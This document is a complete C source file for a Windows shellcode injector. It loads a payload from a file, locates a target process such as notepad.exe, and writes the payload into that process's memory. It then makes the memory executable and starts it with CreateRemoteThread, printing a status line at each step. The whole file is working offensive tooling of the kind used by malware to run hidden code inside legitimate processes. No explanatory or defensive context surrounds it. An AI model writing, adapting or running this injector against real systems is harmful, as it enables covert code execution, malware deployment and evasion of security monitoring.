#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

// Find a process by wide name, return PID (0 if not found)
DWORD FindProcessId(const wchar_t* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { 0 };
    pe.dwSize = sizeof(pe);

    DWORD pid = 0;
    if (Process32FirstW(snapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return pid;
}

int wmain(int argc, wchar_t** argv) {
    const wchar_t* targetName = (argc > 1) ? argv[1] : L"notepad.exe";
    const wchar_t* shellcodePath = (argc > 2) ? argv[2] : L"shellcode.bin";

    wprintf(L"[*] Target process: %ls\n", targetName);
    wprintf(L"[*] Shellcode file: %ls\n", shellcodePath);

    // 1. Read shellcode
    HANDLE hFile = CreateFileW(shellcodePath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] Failed to open shellcode file: %lu\n", GetLastError());
        return 1;
    }

    DWORD shellcodeSize = GetFileSize(hFile, NULL);
    if (shellcodeSize == 0 || shellcodeSize == INVALID_FILE_SIZE) {
        wprintf(L"[!] Invalid shellcode size: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    BYTE* shellcode = (BYTE*)malloc(shellcodeSize);
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, shellcode, shellcodeSize, &bytesRead, NULL) ||
        bytesRead != shellcodeSize) {
        wprintf(L"[!] Failed to read shellcode: %lu\n", GetLastError());
        free(shellcode);
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);

    wprintf(L"[*] Loaded %lu bytes of shellcode\n", shellcodeSize);
    wprintf(L"[*] First bytes: %02X %02X %02X %02X\n",
        shellcode[0], shellcode[1], shellcode[2], shellcode[3]);

    // 2. Find target
    DWORD pid = FindProcessId(targetName);
    if (pid == 0) {
        wprintf(L"[!] Could not find process: %ls\n", targetName);
        free(shellcode);
        return 1;
    }
    wprintf(L"[*] Found %ls (PID %lu)\n", targetName, pid);

    // 3. Open target
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProcess) {
        wprintf(L"[!] OpenProcess failed: %lu (try admin)\n", GetLastError());
        free(shellcode);
        return 1;
    }
    wprintf(L"[*] OpenProcess succeeded: %p\n", hProcess);

    // 4. Allocate
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        wprintf(L"[!] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        free(shellcode);
        return 1;
    }
    wprintf(L"[*] VirtualAllocEx succeeded: %p\n", remoteMem);

    // 5. Write
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, &written) ||
        written != shellcodeSize) {
        wprintf(L"[!] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(shellcode);
        return 1;
    }
    wprintf(L"[*] WriteProcessMemory succeeded (%zu bytes)\n", written);

    // 6. Protect
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, remoteMem, shellcodeSize,
        PAGE_EXECUTE_READ, &oldProtect)) {
        wprintf(L"[!] VirtualProtectEx failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(shellcode);
        return 1;
    }
    wprintf(L"[*] VirtualProtectEx succeeded (old = 0x%lX)\n", oldProtect);

    // 7. Remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        wprintf(L"[!] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(shellcode);
        return 1;
    }
    wprintf(L"[*] CreateRemoteThread succeeded: %p\n", hThread);

    // 8. Wait briefly
    DWORD waitResult = WaitForSingleObject(hThread, 5000);
    if (waitResult == WAIT_TIMEOUT) {
        wprintf(L"[*] Remote thread still running (likely OK)\n");
    }
    else if (waitResult == WAIT_OBJECT_0) {
        DWORD exitCode = 0;
        GetExitCodeThread(hThread, &exitCode);
        wprintf(L"[!] Remote thread exited: 0x%lX\n", exitCode);
        if (exitCode == 0xC0000005) wprintf(L"    -> ACCESS_VIOLATION\n");
        if (exitCode == 0xC000001D) wprintf(L"    -> ILLEGAL_INSTRUCTION\n");
    }

    // 9. Cleanup — never TerminateProcess the target
    CloseHandle(hThread);
    CloseHandle(hProcess);
    free(shellcode);

    wprintf(L"[*] Done.\n");
    return 0;
}